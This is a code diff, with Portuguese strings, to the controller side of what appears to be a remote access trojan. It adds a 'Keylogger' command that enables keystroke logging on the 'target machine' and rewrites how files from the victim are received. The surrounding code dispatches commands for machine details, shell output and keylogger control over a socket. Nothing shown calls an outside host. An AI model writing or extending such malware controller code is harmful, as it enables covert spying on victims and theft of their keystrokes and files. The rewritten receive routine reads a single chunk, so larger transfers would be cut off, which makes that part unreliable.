@@ -15,6 +15,7 @@ def ajuda_alvo():
     print("""\nComandos disponiveis:
     Detalhes da maquina -> Recebe todos os detalhes da maquina alvo
     Detalhes do python -> Recebe todos os detalhes do python instalado na maquina alvo
+    Keylogger -> Ativa o keylogger na maquina alvo e interrompe o programa até o keylogger ser desativado
     Sair -> Sai do controle da maquina, mas não finaliza conexao
     Fechar conexao -> Finaliza conexao com a maquina""")
 
@@ -57,13 +58,8 @@ def salvar_arquivo(mensagem,dir):
 
 def receber_arquivo(conn,dir):
     arquivo = open(dir, "wb")
-    while True:
-        print("\nRecebendo arquivos...")
-        data = conn.recv(1024)
-        if data == b"OK":
-            print("\nArquivos recebidos")
-            break
-        arquivo.write(data)
+    data = conn.recv(2048)
+    arquivo.writelines(data)
     arquivo.close()
 
 def registro_conexoes(conn,addr):
@@ -139,6 +135,7 @@ def alvo(conn,addr):
 
         elif(shell_.upper() == "KEYLOGGER"):
             send_recv_keylogger(conn,shell_)
+
 
         else:
             output_ = send_recv_padrao(conn,shell_)
